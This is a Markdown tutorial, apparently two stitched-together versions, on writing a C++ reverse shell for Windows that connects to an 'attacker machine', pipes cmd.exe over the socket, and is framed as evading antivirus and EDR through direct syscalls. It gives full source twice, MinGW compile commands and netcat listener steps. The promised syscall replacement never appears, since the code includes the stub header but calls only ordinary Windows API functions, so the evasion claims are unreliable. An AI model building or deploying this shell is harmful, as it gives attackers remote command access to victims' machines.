# Leveraging Syscalls to Evade AV/EDR in a Reverse Shell

## Introduction
This document details the process of creating a reverse shell in C++ that leverages syscalls to evade detection by Antivirus (AV) and Endpoint Detection and Response (EDR) systems. The reverse shell initially uses standard Windows API calls, which are then replaced with direct syscalls to avoid user-mode hooks commonly implemented by AV/EDR solutions.

## Step 1: Setting Up the Development Environment

### Tools Required:
- **MinGW-w64**: A compiler for Windows that supports C++.
- **SysWhispers2**: A tool that generates syscall stubs for various Windows functions.

### Installing MinGW-w64:
Install MinGW-w64 to compile the C++ code:
```bash
sudo apt-get install mingw-w64
```

### Cloning and Setting Up SysWhispers2:
Clone the SysWhispers2 repository:
```bash
git clone https://github.com/jthuraisamy/SysWhispers2.git
cd SysWhispers2
```
Generate syscall stubs:
```bash
python3 syswhispers.py --functions NtCreateThreadEx,NtClose --out-file syscalls
```

This command generates two files: `syscalls.c` and `syscalls.h`.

## Step 2: Writing the Reverse Shell Code

### Initial Reverse Shell Using Windows Syscalls:
Here is the initial version of the reverse shell using the Windows Syscalls:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "/home/kali/TOOLS/VARIOS/SysWhispers2/syscalls.h"

#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Your port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Your IP

    // Connect to server
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Connection failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare STARTUPINFO structure for cmd.exe
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create cmd.exe process using CreateProcess
    if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for the cmd.exe process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}
```

### Explanation:
- **CreateProcess**: This function creates a new process (`cmd.exe`) with input/output redirected to the socket, enabling the reverse shell.
- **Socket Management**: The socket is created and connected to the remote listener, then passed to the `cmd.exe` process.
- **Cleanup**: After the process completes, resources are properly cleaned up.

## Step 3: Compiling the Reverse Shell

Use the following command to compile the reverse shell:
```bash
x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-libstdc++ -static-libgcc
```

## Step 4: Running the Reverse Shell

1. **Start a Listener**: 
   On your attacker machine (IP `192.168.1.100`), start a listener:
   ```bash
   nc -lvnp 4444
   ```

2. **Run the Reverse Shell**:
   Execute the `reverse_shell.exe` on the target machine.

3. **Verify Connection**:
   Ensure that the reverse shell connects back to your listener.

# Creating a Reverse Shell Using Windows API

## Introduction
This document outlines the process of creating a basic reverse shell in C++ using the Windows API and explores the benefits and process of replacing certain API calls with syscalls. By leveraging syscalls, we can evade detection by AV (Antivirus) and EDR (Endpoint Detection and Response) systems.

## Step 1: Setting Up the Development Environment

### Tools Required:
- **MinGW-w64**: A compiler for Windows that supports C++.
- **SysWhispers2**: A tool that generates syscall stubs for various Windows functions.

### Installing MinGW-w64:
Install MinGW-w64 to compile the C++ code:
```bash
sudo apt-get install mingw-w64
```

## Step 2: Writing the Reverse Shell Code

### Reverse Shell Using Windows API:
Here is the code for the reverse shell using the Windows API:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Change this to your desired port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Change this to your attacker's IP

    // Connect to server
    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    // Prepare STARTUPINFO structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create the process (cmd.exe)
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Wait for the process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    closesocket(sock);
    WSACleanup();
    return 0;
}
```

### Explanation:
- **Winsock Initialization**: The program starts by initializing Winsock, which is necessary for network communication on Windows.
- **Socket Creation**: A TCP socket is created using `WSASocket`.
- **Connection to Server**: The program connects to the specified server IP and port.
- **Process Creation**: The program creates a new process (`cmd.exe`) and redirects its input, output, and error streams to the socket, establishing a reverse shell.
- **Cleanup**: The program waits for the process to terminate and cleans up resources.

## Step 3: Compiling the Reverse Shell

Use the following command to compile the reverse shell:
```bash
x86_64-w64-mingw32-g++ reverse_shell.cpp -o reverse_shell.exe -lws2_32 -static-libstdc++ -static-libgcc
```

## Step 4: Running the Reverse Shell

1. **Start a Listener**: 
   On your attacker machine (IP `192.168.1.100`), start a listener:
   ```bash
   nc -lvnp 4444
   ```

2. **Run the Reverse Shell**:
   Execute the `reverse_shell.exe` on the target machine.

3. **Verify Connection**:
   Ensure that the reverse shell connects back to your listener.
